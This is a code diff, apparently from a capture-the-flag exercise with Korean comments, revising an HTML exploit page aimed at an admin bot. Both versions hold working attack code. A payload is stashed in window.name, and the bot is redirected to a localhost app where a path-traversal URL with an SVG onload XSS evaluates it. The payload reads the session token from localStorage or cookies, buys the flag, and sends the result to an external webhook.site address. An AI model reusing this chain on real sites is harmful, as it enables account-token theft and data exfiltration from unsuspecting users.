@@ -1,20 +1,27 @@
-<script>
-    // 1. 관리자 봇이 실행할 실제 공격 코드 (플래그 구매 및 웹후크 전송)
-    const webhook = "https://webhook.site/d738cd4d-7a6f-4bb0-b2bc-9da9df904b12";
-    const payload = `
-        fetch('/4/buy', {
-            method: 'POST',
-            headers: { 'token': localStorage.getItem('token') }
-        })
-        .then(r => r.json())
-        .then(d => fetch('${webhook}?flag=' + encodeURIComponent(d.data)));
-    `;
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        const webhook = "https://webhook.site/d738cd4d-7a6f-4bb0-b2bc-9da9df904b12";
 
-    // 2. window.name에 페이로드 저장 (도메인이 바뀌어도 유지됨)
-    window.name = payload;
+        // 1. 실제 실행될 공격 코드 (쿠키에서 토큰 추출 후 플래그 구매)
+        // 공백을 최소화하여 22자 제한 내에서 실행될 eval(name)을 준비합니다.
+        window.name = `
+            const t = document.cookie.split('token=')[1].split(';')[0];
+            fetch('/4/buy', {
+                method: 'POST',
+                headers: { 'token': t }
+            })
+            .then(r => r.json())
+            .then(d => fetch('${webhook}?flag=' + encodeURIComponent(d.data)))
+            .catch(e => fetch('${webhook}?error=' + e));
+        `;
 
-    // 3. 다시 localhost의 XSS 취약 지점으로 리다이렉트
-    // Path Traversal을 통해 /debug API의 결과를 detail 화면에 띄웁니다.
-    const xss_id = "1%2f..%2f..%2fdebug%2f%3csvg%2fonload%3deval(name)%3e";
-    location.href = "http://localhost:3000/#/" + xss_id + "/detail";
-</script>
+        // 2. localhost로 리다이렉트
+        // 핵심: id 파라미터 자체에 경로 탐색 문자를 넣어 /debug API를 호출하게 만듭니다.
+        // %2f(/)를 사용하여 라우터가 경로를 자르지 못하게 방어합니다.
+        const xss_id = "..%2fdebug%2f%3csvg%2fonload%3deval(name)%3e";
+        location.href = "http://localhost:3000/#/" + xss_id + "/detail";
+    </script>
+</body>
+</html>
